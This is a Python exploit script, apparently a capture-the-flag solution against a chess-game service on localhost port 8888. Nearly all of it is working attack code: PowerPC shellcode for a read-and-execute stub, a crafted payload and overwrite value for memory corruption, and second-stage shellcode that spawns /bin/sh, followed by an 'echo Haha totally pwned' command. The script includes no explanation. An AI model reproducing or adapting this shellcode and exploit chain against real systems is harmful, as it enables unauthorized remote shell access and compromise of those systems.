#!/usr/bin/python

import socket
import struct
import time
import sys
import ctypes
import base64
import telnetlib
 
 
shellcode_read_exec = "\x38\xa0\x04\x03"+\
"\x30\x05\xfb\xff" +\
"\x7c\x24\x0b\x78"+\
"\x44\x00\x00\x02"+\
"\x69\x69\x69\x69" +\
"\x7c\x29\x03\xa6"+\
"\x4e\x80\x04\x21"
 
 
shellcode = "\x7c\x3f\x0b\x78"  +\
"\x7c\xa5\x2a\x79"  +\
"\x42\x40\xff\xf9"  +\
"\x7f\x08\x02\xa6"  +\
"\x3b\x18\x01\x34"  +\
"\x98\xb8\xfe\xfb"  +\
"\x38\x78\xfe\xf4"  +\
"\x90\x61\xff\xf8"  +\
"\x38\x81\xff\xf8"  +\
"\x90\xa1\xff\xfc"  +\
"\x3b\xc0\x01\x60"  +\
"\x7f\xc0\x2e\x70"  +\
"\x44\x00\x00\x02"  +\
"/bin/shZ"; 
 
IP = "127.0.0.1"

always = ''

def main():
    #print '************************** AAAAAAAAAAAAAAAA'
    s = socket.create_connection((IP, 8888))

    def read_board():
        time.sleep(0.5)
        return s.recv(4096)
 
    d = read_board()
    #print d
    s.send("e0-d7")
    d = read_board()
    #print d
    payload = struct.pack("<I",0x22)
    payload += shellcode_read_exec
    payload += "y"*1024
    #print '************************** BBBBBBBBBBBBBBBBB'

    s.send(payload)

    d = read_board()
    #print d
    #print '************************** CCCCCCCCCCCCCCCCCC'
    try:
        s.send("a-26-a-14\n\x00\x00"+struct.pack("<1I",0x78400110))
    except:
        return ''
    s.send(shellcode)
    time.sleep(0.2)
    s.send('echo Haha totally pwned\n')
    time.sleep(0.5)
    #print '************************** DDDDDDDDDDDDDDDDDDD'
    return s.recv(2048)

if __name__ == '__main__':
    print main()
